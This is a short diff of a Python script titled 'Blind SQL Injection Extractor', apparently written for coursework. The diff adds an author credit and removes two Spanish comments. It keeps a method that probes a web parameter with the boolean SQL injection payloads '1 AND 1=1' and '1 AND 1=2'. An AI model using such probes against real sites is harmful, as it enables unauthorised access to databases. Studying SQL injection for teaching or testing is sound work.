@@ -1,3 +1,4 @@
+# Creado por Jonathan Carrero (jonathan.carrero@alumnos.ui1.es)
 #!/usr/bin/env python3
 """
 Blind SQL Injection Extractor
@@ -19,11 +20,9 @@ class BlindSQLiExtractor:
         """Prueba si el parámetro es vulnerable a Blind SQLi"""
         print("[*] Probando vulnerabilidad Blind SQLi...")
         
-        # Prueba TRUE: debería mostrar "Artículo Encontrado"
         true_payload = "1 AND 1=1"
         true_response = self.make_request(true_payload)
         
-        # Prueba FALSE: debería mostrar "Artículo No Encontrado"
         false_payload = "1 AND 1=2"
         false_response = self.make_request(false_payload)
         
